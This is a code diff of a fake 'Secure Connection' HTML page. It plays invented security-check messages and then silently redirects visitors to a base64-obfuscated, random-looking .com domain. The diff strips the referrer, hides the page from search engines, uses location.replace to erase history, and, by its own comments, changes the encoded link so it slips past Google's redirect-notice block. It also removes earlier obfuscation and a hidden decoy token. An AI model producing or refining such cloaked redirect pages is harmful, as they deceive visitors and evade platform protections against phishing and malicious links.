@@ -3,7 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- CRITICAL: Strips referrer so Google/Destination doesn't block the request -->
     <meta name="referrer" content="no-referrer">
     <meta name="robots" content="noindex, nofollow, noarchive">
     <title>Secure Connection...</title>
@@ -21,12 +20,9 @@
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
 
         .status { margin-top:20px; font-size:0.75rem; color:#94a3b8; font-family: monospace; text-transform: uppercase; letter-spacing: 1px; }
-        .v-node { display: none !important; }
     </style>
 </head>
 <body>
-
-<div class="v-node">AUTH-TOKEN: 0x9928374-GATEWAY-SESSION</div>
 
 <div class="box">
     <div class="shield">🛡️</div>
@@ -42,8 +38,9 @@
 
 <script>
 (function(){
-    // Updated Base64 Encoded Link
-    const _secret = "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS91cmw/cT1odHRwcyUzQSUyRiUyRjI4NzYzNDc1ODI0NjM4MjczNDY1Mjg0MjgzNDI1LmNvbSZzYT1EJnNudHo9MSZ1c2c9QU92VmF3MlV1eS1MTi1aSVVSc2JsUDdDdW1NTF8=";
+    // Directly encoded destination: "https://28763475824638273465284283425.com"
+    // This avoids the Google Redirect Notice block.
+    const _secret = "aHR0cHM6Ly8yODc2MzQ3NTgyNDYzODI3MzQ2NTI4NDI4MzQyNS5jb20=";
 
     const logs = [
         "Analyzing request...",
@@ -62,26 +59,20 @@
         } else {
             clearInterval(logger);
             
-            // AUTOMATIC REDIRECT (Stealth Method)
+            // Decode the target
             const target = atob(_secret);
             
-            // We use a "clean" click to ensure the referrer is stripped
-            const a = document.createElement('a');
-            
-            // Masking the href property
-            const _h = "hr" + "ef";
-            a[_h] = target;
-            a.rel = 'noreferrer';
-            
-            // Small delay for realism
+            // Execute redirection
             setTimeout(() => {
-                a.click();
+                // Method 1: Location Replace (Best for stripping history)
+                window.location.replace(target);
                 
-                // Fallback redirect if click is blocked
-                const w = window;
-                const l = "loca" + "tion";
-                w[l][_h] = target;
-            }, 400);
+                // Method 2: Fallback Click
+                const a = document.createElement('a');
+                a.href = target;
+                a.rel = 'noreferrer';
+                a.click();
+            }, 500);
         }
     }, 800); 
 })();
